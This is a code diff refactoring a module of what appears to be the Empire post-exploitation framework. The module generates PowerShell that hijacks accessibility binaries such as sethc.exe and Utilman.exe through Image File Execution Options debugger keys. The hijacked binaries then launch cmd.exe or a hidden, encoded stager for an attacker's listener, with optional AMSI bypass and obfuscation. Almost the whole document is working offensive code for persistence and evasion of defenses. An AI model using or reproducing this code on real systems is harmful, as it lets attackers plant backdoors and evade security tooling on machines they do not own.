@@ -1,182 +1,89 @@
 from __future__ import print_function
 
+from builtins import str
 from builtins import object
-
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Invoke-AccessBinary',
-
-            'Author': ['@harmj0y'],
-
-            'Description': ("Sets the debugger for a specified target binary to be cmd.exe, "
-                            "another binary of your choice, or a listern stager. This can be launched from "
-                            "the ease-of-access center (ctrl+U)."),
-
-            'Software': '',
-
-            'Techniques': ['T1044'],
-
-            'Background' : False,
-
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : True,
-
-            'OpsecSafe' : False,
-            
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
-            
-            'Comments': [ ]
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Obfuscate': {
-                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'ObfuscateCommand': {
-                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
-                'Required': False,
-                'Value': r'Token\All\1'
-            },
-            'AMSIBypass': {
-                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'True'
-            },
-            'AMSIBypass2': {
-                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'TargetBinary' : {
-                'Description'   :   'Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)',
-                'Required'      :   True,
-                'Value'         :   'sethc.exe'
-            },
-            'RegPath' : {
-                'Description'   :   'Registry location to store the script code. Last element is the key name.',
-                'Required'      :   False,
-                'Value'         :   r'HKLM:Software\Microsoft\Network\debug'
-            },
-            'Cleanup' : {
-                'Description'   :   'Switch. Disable the Utilman.exe debugger.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'TriggerBinary' : {
-                'Description'   :   'Binary to set for the debugger.',
-                'Required'      :   False,
-                'Value'         :   r'C:\Windows\System32\cmd.exe'
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         # Set booleans to false by default
-        Obfuscate = False
-        AMSIBypass = False
-        AMSIBypass2 = False
+        obfuscate = False
+        amsi_bypass = False
+        amsi_bypass2 = False
 
         # management options
-        cleanup = self.options['Cleanup']['Value']        
-        triggerBinary = self.options['TriggerBinary']['Value']
-        listenerName = self.options['Listener']['Value']
-        targetBinary = self.options['TargetBinary']['Value']
+        cleanup = params['Cleanup']        
+        trigger_binary = params['TriggerBinary']
+        listener_name = params['Listener']
+        target_binary = params['TargetBinary']
 
         # storage options
-        regPath = self.options['RegPath']['Value']
+        reg_path = params['RegPath']
 
         # staging options
-        if (self.options['Obfuscate']['Value']).lower() == 'true':
-            Obfuscate = True
-        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
-        if (self.options['AMSIBypass']['Value']).lower() == 'true':
-            AMSIBypass = True
-        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
-            AMSIBypass2 = True
+        if (params['Obfuscate']).lower() == 'true':
+            obfuscate = True
+        obfuscate_command = params['ObfuscateCommand']
+        if (params['AMSIBypass']).lower() == 'true':
+            amsi_bypass = True
+        if (params['AMSIBypass2']).lower() == 'true':
+            amsi_bypass2 = True
 
-        statusMsg = ""
+        status_msg = ""
         locationString = ""
 
         if cleanup.lower() == 'true':
             # the registry command to disable the debugger for Utilman.exe
-            script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(targetBinary, targetBinary)
+            script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(target_binary, target_binary)
         script = helpers.keyword_obfuscation(script)
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
             return script
         
-        if listenerName != '':
+        if listener_name != '':
             # if there's a listener specified, generate a stager and store it
 
-            if not self.mainMenu.listeners.is_listener_valid(listenerName):
+            if not main_menu.listeners.is_listener_valid(listener_name):
                 # not a valid listener, return nothing for the script
-                print(helpers.color("[!] Invalid listener: " + listenerName))
+                print(helpers.color("[!] Invalid listener: " + listener_name))
                 return ""
 
             else:
                 # generate the PowerShell one-liner
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', obfuscate=Obfuscate,
-                                                                   obfuscationCommand=ObfuscateCommand, AMSIBypass=AMSIBypass,
-                                                                   AMSIBypass2=AMSIBypass2)
+                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', obfuscate=obfuscate,
+                                                                   obfuscationCommand=obfuscate_command, AMSIBypass=amsi_bypass,
+                                                                   AMSIBypass2=amsi_bypass2)
                 
-                encScript = launcher.split(" ")[-1]
+                enc_script = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
 
-            path = "\\".join(regPath.split("\\")[0:-1])
-            name = regPath.split("\\")[-1]
+            path = "\\".join(reg_path.split("\\")[0:-1])
+            name = reg_path.split("\\")[-1]
 
-            statusMsg += " stored in " + regPath + "."
+            status_msg += " stored in " + reg_path + "."
 
-            script = "$RegPath = '"+regPath+"';"
+            script = "$RegPath = '"+reg_path+"';"
             script += "$parts = $RegPath.split('\\');"
             script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
             script += "$name = $parts[-1];"
-            script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"
+            script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+enc_script+";"
 
             # note where the script is stored
             locationString = "$((gp "+path+" "+name+")."+name+")"
 
-            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'"+targetBinary+" debugger set to trigger stager for listener "+listenerName+"'"
+            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'"+target_binary+" debugger set to trigger stager for listener "+listener_name+"'"
 
         else:
             # the registry command to set the debugger for the specified binary to be the binary path specified
-            script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+triggerBinary+"';'"+targetBinary+" debugger set to "+triggerBinary+"'"
+            script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '"+trigger_binary+"';'"+target_binary+" debugger set to "+trigger_binary+"'"
 
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
         script = helpers.keyword_obfuscation(script)
 
         return script
